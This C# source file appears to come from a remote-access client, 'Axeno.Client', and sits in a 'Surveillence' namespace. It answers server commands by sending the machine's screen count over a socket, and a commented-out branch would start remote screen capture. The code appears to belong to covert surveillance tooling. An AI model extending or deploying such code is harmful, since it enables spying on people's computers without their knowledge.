using Axeno.Client.MessagePack;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using Axeno.Client.Helper;

namespace Axeno.Client.Networking.Functions.Surveillence
{
    internal class RemoteDesktop
    {
        public static void HandlePacket(MsgPack msgpack)
        {
            string command = msgpack.ForcePathObject("Option").AsString;
            switch (command)
            {
                case "GetInfo":
                    {
                        SendRDPInfo();
                        break;
                    }
                //case "startRDP":
                //    {
                //        int quality = Convert.ToInt32(msgpack.ForcePathObject("Quality").AsString);
                //        int screen = Convert.ToInt32(msgpack.ForcePathObject("Screen").AsString);
                //        if (!RDPon)
                //        {
                //            RDPon = true;
                //            CaptureRDP(quality, screen);
                //        }
                //        break;
                //    }
                //case "stopRDP":
                //    {
                //        break;
                //    }
            }

        }
        public static void SendRDPInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "RemoteDesktopInformation";
            msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(Screen.AllScreens.Length);
            ClientSocket.Send(msgpack.Encode2Bytes());
        }
    }
}
